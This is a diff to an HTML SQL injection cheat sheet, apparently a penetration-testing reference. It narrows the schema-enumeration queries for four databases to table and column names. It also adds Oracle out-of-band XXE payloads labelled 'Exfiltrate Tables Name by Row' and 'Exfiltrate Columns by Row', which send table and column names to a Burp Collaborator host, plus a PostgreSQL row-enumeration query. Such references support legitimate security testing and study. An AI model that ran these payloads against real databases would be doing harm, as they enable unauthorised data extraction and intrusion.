@@ -206,8 +206,8 @@
             Oracle
         </th>
         <td>
-            <code>SELECT * FROM all_tables</code><br />
-            <code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code>
+            <code>SELECT TABLE_NAME FROM all_tables</code><br />
+            <code>SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code>
         </td>
     </tr>
     <tr>
@@ -215,8 +215,8 @@
             Microsoft
         </th>
         <td>
-            <code>SELECT * FROM information_schema.tables</code><br />
-            <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
+            <code>SELECT TABLE_NAME FROM information_schema.tables</code><br />
+            <code>SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
         </td>
     </tr>
     <tr>
@@ -224,8 +224,8 @@
             PostgreSQL
         </th>
         <td>
-            <code>SELECT * FROM information_schema.tables</code><br />
-            <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
+            <code>SELECT TABLE_NAME FROM information_schema.tables</code><br />
+            <code>SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
         </td>
     </tr>
     <tr>
@@ -233,8 +233,8 @@
             MySQL
         </th>
         <td>
-            <code>SELECT * FROM information_schema.tables</code><br />
-            <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
+            <code>SELECT TABLE_NAME FROM information_schema.tables</code><br />
+            <code>SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
         </td>
     </tr>
     <tr>
@@ -517,7 +517,13 @@
             Oracle
         </th>
         <td>
-            <code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code>
+            <code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code><br />
+            <br />
+            Exfiltrate Tables Name by Row<br />
+            <code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT result_string FROM (SELECT REGEXP_REPLACE(table_name, '[^a-zA-Z0-9\.]', '') AS result_string, ROWNUM rn FROM all_tables)WHERE rn = ROW-NUMBER)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code><br />
+            <br />
+            Exfiltrate Columns by Row<br />
+            <code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT result_string FROM (SELECT REGEXP_REPLACE(column_name, '[^a-zA-Z0-9\.]', '') AS result_string, ROWNUM rn FROM all_tab_columns WHERE table_name='USERS') WHERE rn = ROW-NUMBER)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code>
         </td>
     </tr>
     <tr>
@@ -542,7 +548,9 @@
             execute c; <br />
             END; <br />
             $$ language plpgsql security definer; <br />
-            SELECT f();</code>
+            SELECT f();</code><br/>
+            <br/>
+            <code>SELECT result_string FROM (SELECT REGEXP_REPLACE(table_name, '[^a-zA-Z0-9\.]', '', 'g') AS result_string, ROW_NUMBER() OVER (ORDER BY table_name) AS rn FROM information_schema.tables WHERE table_schema = 'public') AS sub WHERE rn = 3;</code>
         </td>
     </tr>
     <tr>
